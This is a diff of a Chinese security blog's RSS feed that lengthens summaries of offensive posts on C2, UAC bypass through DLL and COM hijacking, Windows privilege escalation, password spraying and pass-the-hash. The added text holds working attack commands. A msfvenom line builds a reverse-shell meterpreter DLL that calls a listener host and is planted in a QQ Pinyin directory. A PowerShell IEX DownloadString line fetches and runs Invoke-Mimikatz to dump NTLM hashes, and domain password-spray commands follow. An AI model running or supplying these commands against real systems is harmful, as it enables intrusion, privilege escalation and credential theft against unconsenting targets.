@@ -19,7 +19,47 @@
 &lt;/div>
 &lt;/div>&lt;h2 id="0x02-c2command-and-control简介">0x02 C2(Command and Control)简介&lt;/h2>
 &lt;p>C2，其含义在安全领域中意思是命令与控制，具体的技术表现为远控木马。
-是一种通常用于持续控制一个或多个目标的技术手段，这个技术手段覆盖了&lt;strong>多种&lt;/strong>网络通信（计算机交互、通信）的方式。&lt;/p></description></item><item><title>Visual Studio 调试DLL</title><link>https://payloads.online/archivers/2019-01-26/2/</link><pubDate>Sat, 26 Jan 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-01-26/2/</guid><description>&lt;p>
+是一种通常用于持续控制一个或多个目标的技术手段，这个技术手段覆盖了&lt;strong>多种&lt;/strong>网络通信（计算机交互、通信）的方式。&lt;/p>
+&lt;p>这个“多种”指的是有很多种方式，基于HTTP、SMTP、HTTPS、纯数据报文、&amp;hellip;.&lt;/p>
+&lt;p>
+ &lt;img src="https://images.payloads.online/544f0bbe-4f5f-11ec-8dda-00d861bf4abb.png" alt="2019-03-30-13-59-17">
+
+&lt;/p>
+&lt;h2 id="0x03-c2的原理">0x03 C2的原理&lt;/h2>
+&lt;p>命令与控制的原理就是目标机器主动或被动的与控制端进行交互，不断获取指令执行。&lt;/p>
+&lt;p>交互：可能不是一个直接的网络连接&lt;/p>
+&lt;p>命令与控制在行为上一般需要与许多操作系统接口进行交互，例如：网络通信、文件读写、进程管理等。&lt;/p>
+&lt;h2 id="0x04-后渗透平台--cobalt-strike">0x04 后渗透平台 – Cobalt Strike&lt;/h2>
+&lt;p>
+ &lt;img src="https://images.payloads.online/54b23a54-4f5f-11ec-8073-00d861bf4abb.png" alt="2019-03-30-14-01-17">
+
+&lt;/p>
+&lt;p>Cobalt Strike是一个跨平台、多人协作式、红队评估后渗透平台。
+它支持多人通信、权限维持、文件操作、提权、横向渗透……等多种功能，使用者只需要部署好teamserver就可以在任意平台上连接teamserver进行渗透。&lt;/p>
+&lt;p>&lt;a href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com/&lt;/a>&lt;/p>
+&lt;h2 id="0x05-后渗透平台--metasploit-framework">0x05 后渗透平台 – Metasploit Framework&lt;/h2>
+&lt;p>
+ &lt;img src="https://images.payloads.online/54ecdbb4-4f5f-11ec-8615-00d861bf4abb.png" alt="2019-03-30-14-02-15">
+
+&lt;/p>
+&lt;p>Metasploit Framework是一个跨平台、开源、较为开放式的安全评估平台。
+它支持权限维持、文件操作、提权、横向渗透、载荷生成……等多种功能，使得渗透更加灵活。&lt;/p>
+&lt;p>&lt;a href="https://www.metasploit.com/">https://www.metasploit.com/&lt;/a>&lt;/p>
+&lt;h2 id="0x06-后渗透的需求">0x06 后渗透的需求&lt;/h2>
+&lt;p>通过一些常用的平台、工具总结，我得出一些以下几个基本需求：&lt;/p>
+&lt;p>
+ &lt;img src="https://images.payloads.online/55265e0c-4f5f-11ec-8636-00d861bf4abb.png" alt="2019-03-30-14-03-35">
+
+&lt;/p>
+&lt;p>这些需求就必定要形成一个跨平台支持、兼容性最好、拓展性强的框架，而大部分框架的基础模式就是如下所说。&lt;/p>
+&lt;h3 id="框架基本组成">框架基本组成&lt;/h3>
+&lt;ul>
+&lt;li>PAYLOAD&lt;/li>
+&lt;li>模块&lt;/li>
+&lt;li>漏洞&lt;/li>
+&lt;/ul>
+&lt;h2 id="0x07-payload进入目标机器内存的方式">0x07 PAYLOAD进入目标机器内存的方式&lt;/h2>
+&lt;p>在常规的渗透过程里，为了获得一定的权限，基本上绝大部分的动机都是在目标机器上的内存种执行指令，它的表现形式大部分都是一个后门、加载器等。&lt;/p></description></item><item><title>Visual Studio 调试DLL</title><link>https://payloads.online/archivers/2019-01-26/2/</link><pubDate>Sat, 26 Jan 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-01-26/2/</guid><description>&lt;p>
  &lt;img src="https://images.payloads.online/4b0d4868-4f5f-11ec-b255-00d861bf4abb.png" alt="2019-01-26-18-26-19">
 
 &lt;/p>
@@ -57,7 +97,18 @@
 &lt;/ul>
 &lt;p>在最后它会寻找&lt;code>C:\Users\&amp;lt;Username&amp;gt;\APPData\Local\Microsoft\WindowsApps\&lt;/code>这个目录，而这个目录的读写是不需要触发UAC获得管理员权限来操作的。&lt;/p>
 &lt;p>由此，可以利用该缺陷，将Coolis转换成DLL，上传至&lt;code>C:\Users\&amp;lt;Username&amp;gt;\APPData\Local\Microsoft\WindowsApps\&lt;/code>，紧接着执行SystemPropertiesAdvanced.exe，它会自动将&lt;code>srrstr.dll&lt;/code>加载至SystemPropertiesAdvanced.exe进程的内存，同样的，我们也就拥有了管理员权限。&lt;/p>
-&lt;p>在此之前，我有想过在下列模块里做一些优化：&lt;/p></description></item><item><title>DLL Hijacking &amp; COM Hijacking ByPass UAC - 议题解读</title><link>https://payloads.online/archivers/2018-12-22/1/</link><pubDate>Sat, 22 Dec 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-12-22/1/</guid><description>&lt;blockquote>
+&lt;p>在此之前，我有想过在下列模块里做一些优化：&lt;/p>
+&lt;ul>
+&lt;li>exploit/windows/local/bypassuac_fodhelper&lt;/li>
+&lt;li>exploit/windows/local/bypassuac_injection&lt;/li>
+&lt;li>exploit/windows/local/bypassuac_comhijack&lt;/li>
+&lt;/ul>
+&lt;p>我觉得COM劫持的空间还是很大的，并且也一定程度上能够bypass AV。&lt;/p>
+&lt;p>Demo：&lt;/p>
+&lt;!-- raw HTML omitted -->
+&lt;h2 id="0x03-总结">0x03 总结&lt;/h2>
+&lt;p>UAC、DLL劫持、COM劫持的问题肯定还会有很多、但是以前的轮子到现在拿起来用基本上都会被行为拦截，这就需要掌握原理去自己探索、创造。&lt;/p>
+&lt;p>系统镜像：&lt;code>ed2k://|file|cn_windows_server_2019_x64_dvd_4de40f33.iso|5086887936|7DCDDD6B0C60A0D019B6A93D8F2B6D31|/&lt;/code>&lt;/p></description></item><item><title>DLL Hijacking &amp; COM Hijacking ByPass UAC - 议题解读</title><link>https://payloads.online/archivers/2018-12-22/1/</link><pubDate>Sat, 22 Dec 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-12-22/1/</guid><description>&lt;blockquote>
 &lt;p>在线地址：&lt;a href="https://www.bilibili.com/video/av51718274/">https://www.bilibili.com/video/av51718274/&lt;/a>&lt;/p>
 &lt;/blockquote>
 &lt;!-- raw HTML omitted -->
@@ -93,7 +144,31 @@
 &lt;p>
  &lt;img src="https://images.payloads.online/4516d88e-4f5f-11ec-971e-00d861bf4abb.png" alt="">
 
-&lt;/p></description></item><item><title>彻底理解Windows认证 - 议题解读</title><link>https://payloads.online/archivers/2018-11-30/1/</link><pubDate>Fri, 30 Nov 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-11-30/1/</guid><description>&lt;p>在内部分享的《彻底理解Windows认证》议题解读，本次议题围绕着Windows认证分别讲解了：&lt;/p>
+&lt;/p>
+&lt;p>在Windows平台下，我们使用的应用程序中的功能其实大多都很相似，窗口调用窗口的模块，分配内存调用内存管理的模块，文件操作调用IO模块，这些模块在Windows里的具体表现就是DLL文件。&lt;/p>
+&lt;h2 id="0x03-dll的加载过程">0X03 DLL的加载过程&lt;/h2>
+&lt;ul>
+&lt;li>1.程序所在目录&lt;/li>
+&lt;li>2.程序加载目录（SetCurrentDirectory）&lt;/li>
+&lt;li>3.系统目录即 SYSTEM32 目录&lt;/li>
+&lt;li>4.16位系统目录即 SYSTEM 目录&lt;/li>
+&lt;li>5.Windows目录&lt;/li>
+&lt;li>6.PATH环境变量中列出的目录&lt;/li>
+&lt;/ul>
+&lt;p>PS：Windows操作系统通过“DLL路径搜索目录顺序”和“Know DLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。&lt;/p>
+&lt;p>注册表路径：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs&lt;/p>
+&lt;p>
+ &lt;img src="https://images.payloads.online/456a6e72-4f5f-11ec-b36a-00d861bf4abb.png" alt="">
+
+&lt;/p>
+&lt;h3 id="dll的加载过程--know-dlls注册表项">DLL的加载过程 – Know DLLs注册表项&lt;/h3>
+&lt;p>Know DLLs注册表项里的DLL列表在应用程序运行后就已经加入到了内核空间中，多个进程公用这些模块，必须具有非常高的权限才能修改。&lt;/p>
+&lt;p>
+ &lt;img src="https://images.payloads.online/45b927d8-4f5f-11ec-9b6b-00d861bf4abb.png" alt="">
+
+&lt;/p>
+&lt;h3 id="dll的加载过程--process-monitor">DLL的加载过程 – Process Monitor&lt;/h3>
+&lt;p>Process Monitor是Windows的高级监视工具，可显示实时文件系统，注册表和进程/线程活动。&lt;/p></description></item><item><title>彻底理解Windows认证 - 议题解读</title><link>https://payloads.online/archivers/2018-11-30/1/</link><pubDate>Fri, 30 Nov 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-11-30/1/</guid><description>&lt;p>在内部分享的《彻底理解Windows认证》议题解读，本次议题围绕着Windows认证分别讲解了：&lt;/p>
 &lt;ul>
 &lt;li>Pass The Hash&lt;/li>
 &lt;li>Silver Tickets、Golden Tickets、&lt;/li>
@@ -148,7 +223,42 @@
  &lt;/tr>
  &lt;/tbody>
 &lt;/table>
-&lt;p>&lt;strong>&lt;a href="https://docs.microsoft.com/en-us/windows/desktop/sysinfo/hkey-classes-root-key">HKEY_CLASSES_ROOT&lt;/a> = HKEY_LOCAL_MACHINE + HKEY_CURRENT_USER&lt;/strong>&lt;/p></description></item><item><title>Windows 本地特权提升技巧</title><link>https://payloads.online/archivers/2018-10-08/1/</link><pubDate>Mon, 08 Oct 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-10-08/1/</guid><description>&lt;h2 id="0x00-前言">0x00 前言&lt;/h2>
+&lt;p>&lt;strong>&lt;a href="https://docs.microsoft.com/en-us/windows/desktop/sysinfo/hkey-classes-root-key">HKEY_CLASSES_ROOT&lt;/a> = HKEY_LOCAL_MACHINE + HKEY_CURRENT_USER&lt;/strong>&lt;/p>
+&lt;h3 id="clsid">CLSID&lt;/h3>
+&lt;p>首先需要介绍一下CLSID(Class Identifier)，中文翻译为：“全局唯一标识符”。&lt;/p>
+&lt;p>CLSID是指Windows系统对于不同的应用程序，文件类型，OLE对象，特殊文件夹以及各种系统组件分配的一个唯一表示它的ID代码，用于对其身份的标识和与其他对象进行区分。&lt;/p>
+&lt;p>也就是说CLSID就是对象的身份证号，而当一个应用程序想要调用某个对象时，也是通过CLSID来寻找对象的。&lt;/p>
+&lt;p>
+ &lt;img src="https://images.payloads.online/2f2090f6-4f5f-11ec-a05c-00d861bf4abb.png" alt="">
+
+&lt;/p>
+&lt;p>按下Ctrl+R打开运行窗口，键入 &lt;code>::{20D04FE0-3AEA-1069-A2D8-08002B30309D}&lt;/code>即可打开“我的电脑”&lt;/p>
+&lt;p>回收站的CLISD是：&lt;code>::{645FF040-5081-101B-9F08-00AA002F954E}&lt;/code>&lt;/p>
+&lt;h3 id="clsid是如何创建的">CLSID是如何创建的&lt;/h3>
+&lt;p>CLSID结构体：&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c++" data-lang="c++">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">typedef&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">_GUID&lt;/span> {  
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	DWORD Data1; &lt;span style="color:#75715e">// 随机数  
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	WORD Data2; &lt;span style="color:#75715e">// 和时间相关  
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	WORD Data3; &lt;span style="color:#75715e">// 和时间相关  
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	BYTE Data4[&lt;span style="color:#ae81ff">8&lt;/span>]; &lt;span style="color:#75715e">// 和网卡MAC相关 
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	} GUID;  
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">typedef&lt;/span> GUID CLSID;  &lt;span style="color:#75715e">// 组件ID 
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	&lt;span style="color:#66d9ef">typedef&lt;/span> GUID IID;    &lt;span style="color:#75715e">// 接口ID
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>通过操作系统提供的结构体与API来创建CLSID，保障唯一性。&lt;/p></description></item><item><title>Windows 本地特权提升技巧</title><link>https://payloads.online/archivers/2018-10-08/1/</link><pubDate>Mon, 08 Oct 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-10-08/1/</guid><description>&lt;h2 id="0x00-前言">0x00 前言&lt;/h2>
 &lt;p>本文主要有以下章节：&lt;/p>
 &lt;ul>
 &lt;li>1.服务路径权限可控提权&lt;/li>
@@ -187,7 +297,62 @@
  &lt;img src="https://images.payloads.online/2942f94e-4f5f-11ec-99bc-00d861bf4abb.png" alt="">
 
 
-惊喜的发现，&lt;code>“Everyone”&lt;/code>用户可以读写该目录下所有文件。&lt;/p></description></item><item><title>QQ拼音输入法6.0最新版DLL劫持 - 可利用于提权</title><link>https://payloads.online/archivers/2018-06-09/1/</link><pubDate>Sat, 09 Jun 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-06-09/1/</guid><description>&lt;h2 id="0x00-dll劫持简介">0x00 DLL劫持简介&lt;/h2>
+惊喜的发现，&lt;code>“Everyone”&lt;/code>用户可以读写该目录下所有文件。&lt;/p>
+&lt;p>Ps:Everyone代指当前主机下所有用户，包含（Guest）&lt;/p>
+&lt;h3 id="提权过程">提权过程&lt;/h3>
+&lt;p>首先，我启用了win7的Guest用户，使用Guest用户登录这台机器：&lt;/p>
+&lt;p>
+ &lt;img src="https://images.payloads.online/297e7e1a-4f5f-11ec-af7b-00d861bf4abb.png" alt="">
+
+
+
+ &lt;img src="https://images.payloads.online/29b1286a-4f5f-11ec-93d3-00d861bf4abb.png" alt="">
+
+
+Ping命令都不让用，限制很死。&lt;/p>
+&lt;p>使用msf生成一个木马：&lt;/p>
+&lt;p>
+ &lt;img src="https://images.payloads.online/29f12ac8-4f5f-11ec-aa05-00d861bf4abb.png" alt="">
+
+
+将木马替换为gwservice.exe&lt;/p>
+&lt;p>
+ &lt;img src="https://images.payloads.online/2a32c9ce-4f5f-11ec-b4b8-00d861bf4abb.png" alt="">
+
+
+先执行测试一下，能否获得Guest的session：&lt;/p>
+&lt;p>
+ &lt;img src="https://images.payloads.online/2a70111c-4f5f-11ec-bef8-00d861bf4abb.png" alt="">
+
+
+获得会话后，注销（或重启）Guest用户，登录管理员用户，获得SYSTEM权限：&lt;/p>
+&lt;p>
+ &lt;img src="https://images.payloads.online/2ab054b6-4f5f-11ec-90e5-00d861bf4abb.png" alt="">
+
+
+提权情况还是要根据服务器本身的环境，我总结的这些方法就是为了优先采用这些方式，而不是直接突突搞EXP ……&lt;/p>
+&lt;h2 id="0x02-模糊路径提权">0x02 模糊路径提权&lt;/h2>
+&lt;p>在上一篇中，我们继续基于&lt;code>Gateway Session Service&lt;/code>这个服务进行分析其他提权方法：&lt;/p>
+&lt;p>&lt;code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services&lt;/code>&lt;/p>
+&lt;p>
+ &lt;img src="https://images.payloads.online/2af42196-4f5f-11ec-b362-00d861bf4abb.png" alt="">
+
+
+其中有一个ImagePath的名称，它的值是：&lt;/p>
+&lt;p>&lt;code>C:\Program Files (x86)\Gateway\SSLVPN\gwservice.exe&lt;/code>&lt;/p>
+&lt;p>当服务启动时，将会读取这个ImagePath的值，我们无法更改这个值，但是可以通过Windows的特性来巧妙提权。
+注意：当前这个环境只是演示，排除目录权限的原因是100%成功的。&lt;/p>
+&lt;p>重点：当ImagePath的值不是一个绝对路径时，我们可以通过Windows API中的&lt;code>“CreateProcessA”&lt;/code>函数的特性，将木马放置在带有空格目录的同级目录下，当服务启动时，会首先在空格目录当前目录搜索第一个单词的二进制文件。&lt;/p>
+&lt;p>例子：&lt;/p>
+&lt;p>&lt;code>C:\Program Files (x86)\server process\ssl\service.exe&lt;/code>&lt;/p>
+&lt;p>如果不是绝对路径，寻找过程如下：&lt;/p>
+&lt;ol>
+&lt;li>C:\Program.exe&lt;/li>
+&lt;li>C:\Program Files (x86)\server.exe&lt;/li>
+&lt;li>C:\Program Files (x86)\server process\ssl\service.exe&lt;/li>
+&lt;/ol>
+&lt;p>参考链接：
+&lt;a href="https://docs.microsoft.com/zh-cn/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessa">https://docs.microsoft.com/zh-cn/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessa&lt;/a>&lt;/p></description></item><item><title>QQ拼音输入法6.0最新版DLL劫持 - 可利用于提权</title><link>https://payloads.online/archivers/2018-06-09/1/</link><pubDate>Sat, 09 Jun 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-06-09/1/</guid><description>&lt;h2 id="0x00-dll劫持简介">0x00 DLL劫持简介&lt;/h2>
 &lt;p>《DLL劫持》技术当一个可执行文件运行时，Windows加载器将可执行模块映射到进程的地址空间中，加载器分析可执行模块的输入表，并设法找出任何需要的DLL，并将它们映射到进程的地址空间中。 &amp;ndash; 百度百科&lt;/p>
 &lt;h2 id="0x01-应用程序寻找dll的过程">0x01 应用程序寻找DLL的过程&lt;/h2>
 &lt;ul>
@@ -218,7 +383,23 @@
 &lt;p>
  &lt;img src="https://images.payloads.online/24ed1d7a-4f5f-11ec-9f88-00d861bf4abb.jpg" alt="0x02">
 
-&lt;/p></description></item><item><title>Windows域渗透 - 用户密码枚举</title><link>https://payloads.online/archivers/2018-05-02/1/</link><pubDate>Wed, 02 May 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-05-02/1/</guid><description>&lt;h2 id="0x00-前言">0x00 前言&lt;/h2>
+&lt;/p>
+&lt;p>那么这个漏洞刚刚好也符合我们的案例：C:\Program Files (x86)\Tencent\QQPinyin\6.0.5005.400&lt;/p>
+&lt;p>这个目录是任何人都可以读写的，使用MSF生成DLL：&lt;/p>
+&lt;p>&lt;code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.211.55.19 LPORT=4478 -f dll &amp;gt; ntmarta.dll&lt;/code>&lt;/p>
+&lt;p>接下来通过任意途径，将dll copy到&lt;code>C:\Program Files (x86)\Tencent\QQPinyin\6.0.5005.400&lt;/code>路径下即可&lt;/p>
+&lt;p>MSF配置如下：&lt;/p>
+&lt;p>
+ &lt;img src="https://images.payloads.online/25291a8c-4f5f-11ec-9430-00d861bf4abb.jpg" alt="0x03">
+
+&lt;/p>
+&lt;p>当用户使用输入法的时候、或者重启PC的时候，或者切换输入法的时候，都将会触发，我们可以获得一个Meterpreter会话。&lt;/p>
+&lt;p>
+ &lt;img src="https://images.payloads.online/256ca7ca-4f5f-11ec-89a6-00d861bf4abb.jpg" alt="0x04">
+
+&lt;/p>
+&lt;h2 id="0x03-视频演示">0x03 视频演示&lt;/h2>
+&lt;!-- raw HTML omitted --></description></item><item><title>Windows域渗透 - 用户密码枚举</title><link>https://payloads.online/archivers/2018-05-02/1/</link><pubDate>Wed, 02 May 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-05-02/1/</guid><description>&lt;h2 id="0x00-前言">0x00 前言&lt;/h2>
 &lt;p>在进行Windows域渗透的时候，面对庞大的用户账号，不知该从何下手，扫描网络服务有怕搞出大动静，肿么办呢？&lt;/p>
 &lt;h2 id="0x01-powershell">0x01 Powershell&lt;/h2>
 &lt;p>目前已经有很多Powershell集合脚本，用于域渗透简直舒爽&lt;/p>
@@ -248,7 +429,14 @@
 &lt;li>参数： &lt;code>Force&lt;/code> 当枚举出第一个后继续枚举，不询问&lt;/li>
 &lt;/ul>
 &lt;h2 id="0x03-使用说明">0x03 使用说明&lt;/h2>
-&lt;p>使用例子：&lt;/p></description></item><item><title>使用CrackMapExec 进行 NTLM Hash传递攻击</title><link>https://payloads.online/archivers/2018-03-27/1/</link><pubDate>Tue, 27 Mar 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-03-27/1/</guid><description>&lt;h2 id="0x01-前言">0x01 前言&lt;/h2>
+&lt;p>使用例子：&lt;/p>
+&lt;p>&lt;code>C:\PS&amp;gt; Get-DomainUserList&lt;/code>&lt;/p>
+&lt;p>该命令将从域中收集用户列表。&lt;/p>
+&lt;p>&lt;code>C:\PS&amp;gt; Get-DomainUserList -Domain 域名 -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt&lt;/code>&lt;/p>
+&lt;p>该命令将收集域“域名”中的用户列表，包括任何未被禁用且未接近锁定状态的帐户。 它会将结果写入“userlist.txt”文件中&lt;/p>
+&lt;p>&lt;code>C:\PS&amp;gt; Invoke-DomainPasswordSpray -Password Winter2016&lt;/code>&lt;/p>
+&lt;p>该命令将会从域环境中获取用户名，然后逐个以密码&lt;code>Winter2016&lt;/code>进行认证枚举&lt;/p>
+&lt;p>&lt;code>C:\PS&amp;gt; Invoke-DomainPasswordSpray -UserList users.txt -Domain 域名 -PasswordList passlist.txt -OutFile sprayed-creds.txt&lt;/code>&lt;/p></description></item><item><title>使用CrackMapExec 进行 NTLM Hash传递攻击</title><link>https://payloads.online/archivers/2018-03-27/1/</link><pubDate>Tue, 27 Mar 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-03-27/1/</guid><description>&lt;h2 id="0x01-前言">0x01 前言&lt;/h2>
 &lt;p>早期&lt;code>SMB&lt;/code>协议在网络上传输明文口令。后来出现 &lt;code>LAN Manager Challenge/Response &lt;/code>验证机制，简称&lt;code>LM&lt;/code>，它是如此简单以至很容易就被破解。微软提出了WindowsNT挑战/响应验证机制，称之为NTLM。&lt;/p>
 &lt;p>从&lt;code>Win2000&lt;/code>开始默认协议为&lt;code>Kerboros&lt;/code>，下列情况会调用&lt;code>NTLM&lt;/code>：&lt;/p>
 &lt;ul>
@@ -282,7 +470,29 @@
 &lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
 &lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>针对某跨国企业的一次渗透测试-持续</title><link>https://payloads.online/archivers/2018-01-30/1/</link><pubDate>Tue, 30 Jan 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-01-30/1/</guid><description>&lt;p>文章涉及泄漏厂商隐私，已经删除！&lt;/p></description></item><item><title>针对国内一大厂的后渗透 - 持续</title><link>https://payloads.online/archivers/2017-12-28/1/</link><pubDate>Thu, 28 Dec 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-12-28/1/</guid><description>&lt;h2 id="0x00-前言">0x00 前言&lt;/h2>
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>apt-get install -y libssl-dev libffi-dev python-dev build-essential
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pip install crackmapexec
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="0x04-传递ntlm-hash执行命令">0x04 传递NTLM Hash执行命令&lt;/h2>
+&lt;h3 id="使用mimikatz获取ntlm-hash">使用&lt;code>Mimikatz&lt;/code>获取&lt;code>NTLM Hash&lt;/code>&lt;/h3>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PS C:\Users\administrator\Documents&lt;span style="color:#f92672">&amp;gt;&lt;/span>IEX(New&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#a6e22e">Object&lt;/span> Net&lt;span style="color:#f92672">.&lt;/span>WebClient)&lt;span style="color:#f92672">.&lt;/span>DownloadString(&lt;span style="color:#e6db74">&amp;#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PS C:\Users\administrator\Documents&lt;span style="color:#f92672">&amp;gt;&lt;/span>Invoke&lt;span style="color:#f92672">-&lt;/span>Mimikatz
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>获取NTLM Hash&lt;/p></description></item><item><title>针对某跨国企业的一次渗透测试-持续</title><link>https://payloads.online/archivers/2018-01-30/1/</link><pubDate>Tue, 30 Jan 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-01-30/1/</guid><description>&lt;p>文章涉及泄漏厂商隐私，已经删除！&lt;/p></description></item><item><title>针对国内一大厂的后渗透 - 持续</title><link>https://payloads.online/archivers/2017-12-28/1/</link><pubDate>Thu, 28 Dec 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-12-28/1/</guid><description>&lt;h2 id="0x00-前言">0x00 前言&lt;/h2>
 &lt;p>此文将全部脱敏，涉及某大厂商，中间会穿插一些小的知识点与细节。&lt;/p>
